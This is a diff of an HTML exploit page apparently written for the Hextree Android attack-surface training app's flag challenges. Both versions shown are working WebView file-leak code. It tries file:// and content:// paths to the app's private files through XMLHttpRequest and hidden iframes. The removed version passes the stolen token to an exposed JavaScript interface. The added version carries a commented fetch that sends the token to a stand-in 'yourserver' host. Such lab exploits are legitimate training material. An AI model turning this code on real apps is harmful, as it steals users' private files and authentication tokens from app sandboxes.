@@ -1,95 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Flag40 Exploit</title>
+  <meta charset="UTF-8">
+  <title>WebView File Leak Demo</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    button { padding: 10px 20px; font-size: 16px; margin-bottom: 20px; }
+    #status { margin-top: 15px; font-weight: bold; }
+    pre { background: #f4f4f4; padding: 10px; border-radius: 8px; max-height: 200px; overflow-y: auto; }
+  </style>
 </head>
 <body>
-    <h1>WebView Exploit in Progress...</h1>
-    <div id="status">Loading...</div>
-    
-    <script>
-        let tokenFound = false;
-        
-        // Enhanced XHR file reading function
-        function leakFileXHR(url) {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.responseText && !tokenFound) {
-                    console.log('XHR Token found:', xhr.responseText);
-                    document.getElementById('status').innerHTML = 'Token found via XHR: ' + xhr.responseText.substring(0, 10) + '...';
-                    attemptAuth(xhr.responseText.trim());
-                    tokenFound = true;
-                }
-            };
-            xhr.onerror = function(error) {
-                console.log('XHR error for:', url);
-            };
-            xhr.send();
-        }
-        
-   
-        
-        
-        // Function to attempt authentication with token
-        function attemptAuth(token) {
-            if (!token || tokenFound) return;
-            
-            console.log('Attempting authentication with token:', token);
-            
-            // Call the exposed JavaScript interface
-            if (window.hextree && window.hextree.authCallback) {
-                try {
-                    window.hextree.authCallback(token);
-                    document.getElementById('status').innerHTML = 'Authentication callback sent successfully!';
-                    console.log('Authentication callback executed');
-                } catch (e) {
-                    console.error('Error calling authCallback:', e);
-                    document.getElementById('status').innerHTML = 'Error calling authentication callback';
-                }
+  <h2>WebView File Leak Exploit</h2>
+  <button onclick="startAttack()">🚀 Start Attack</button>
+  <div id="status">Idle...</div>
+  <pre id="log"></pre>
+
+  <script>
+    // List of possible file paths to try
+    const filePaths = [
+      "file:///data/data/io.hextree.attacksurface/files/flag39.txt",
+      "content://io.hextree.attacksurface/flag39",
+      "file:///sdcard/Download/flag39.txt"
+    ];
+
+    let tokenFound = false;
+
+    function log(msg) {
+      console.log(msg);
+      document.getElementById("log").textContent += msg + "\n";
+    }
+
+    // Leak using XMLHttpRequest
+    function leakFileXHR(url) {
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            if (xhr.status === 200 && xhr.responseText && !tokenFound) {
+              log("[XHR] Success at " + url);
+              document.getElementById("status").innerHTML = "Token found via XHR: " + xhr.responseText.substring(0, 15) + "...";
+              attemptAuth(xhr.responseText.trim());
+              tokenFound = true;
             } else {
-                document.getElementById('status').innerHTML = 'JavaScript interface not available';
-                console.log('hextree interface not found');
+              log("[XHR] Failed at " + url + " (status " + xhr.status + ")");
             }
-        }
-        
-        // Multiple file path attempts
-        const filePaths = [
-            'content://io.hextree.attacksurface/files/token.txt',
-            'content://io.hextree.attacksurface.fileprovider/files/token.txt',
-            'file:///android_asset/token.txt',
-            'file:///sdcard/Android/data/io.hextree.attacksurface/files/token.txt',
-            'file:///storage/emulated/0/Android/data/io.hextree.attacksurface/files/token.txt'
-        ];
-        
-        // Start the attack
-        function startAttack() {
-            document.getElementById('status').innerHTML = 'Starting file leak attempts...';
-            
-            // Try all file paths with both methods
-            filePaths.forEach((path, index) => {
-                setTimeout(() => {
-                    console.log('Trying XHR for:', path);
-                    leakFileXHR(path);
-                }, index * 200);
-                
-                setTimeout(() => {
-                    console.log('Trying iframe for:', path);
-                    leakFileIframe(path);
-                }, index * 200 + 100);
-            });
-        }
-        
-        // Initialize
-        window.onload = function() {
-            console.log('Page loaded, available interfaces:', Object.keys(window));
-            if (window.hextree) {
-                console.log('Hextree interface methods:', Object.keys(window.hextree));
-            }
-            
-            // Start attack after a brief delay
-            setTimeout(startAttack, 200);
+          }
         };
-    </script>
+        xhr.onerror = () => log("[XHR] Error fetching " + url);
+        xhr.send();
+      } catch (e) {
+        log("[XHR] Exception for " + url + ": " + e);
+      }
+    }
+
+    // Leak using hidden iframe
+    function leakFileIframe(url) {
+      const iframe = document.createElement("iframe");
+      iframe.style.display = "none";
+      iframe.onload = () => {
+        try {
+          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+          if (!iframeDoc || tokenFound) return;
+          const textContent = iframeDoc.body ? iframeDoc.body.innerText : iframeDoc.documentElement.innerHTML;
+          if (textContent && textContent.trim() && !tokenFound) {
+            log("[Iframe] Success at " + url);
+            document.getElementById("status").innerHTML = "Token found via iframe: " + textContent.substring(0, 15) + "...";
+            attemptAuth(textContent.trim());
+            tokenFound = true;
+          }
+        } catch (e) {
+          log("[Iframe] Cannot read iframe for " + url + " (" + e + ")");
+        }
+      };
+      iframe.onerror = () => log("[Iframe] Load error for " + url);
+      iframe.src = url;
+      document.body.appendChild(iframe);
+    }
+
+    // Simulated authentication attempt
+    function attemptAuth(token) {
+      log("Attempting authentication with token: " + token);
+      // Normally you'd send token back to your server:
+      // fetch("https://yourserver/receive?token=" + encodeURIComponent(token))
+    }
+
+    // Start scanning files
+    function startAttack() {
+      document.getElementById("status").innerHTML = "Starting file leak attempts...";
+      filePaths.forEach((path, i) => {
+        setTimeout(() => {
+          log("Trying: " + path);
+          leakFileXHR(path);
+          leakFileIframe(path);
+        }, i * 400);
+      });
+    }
+  </script>
 </body>
 </html>
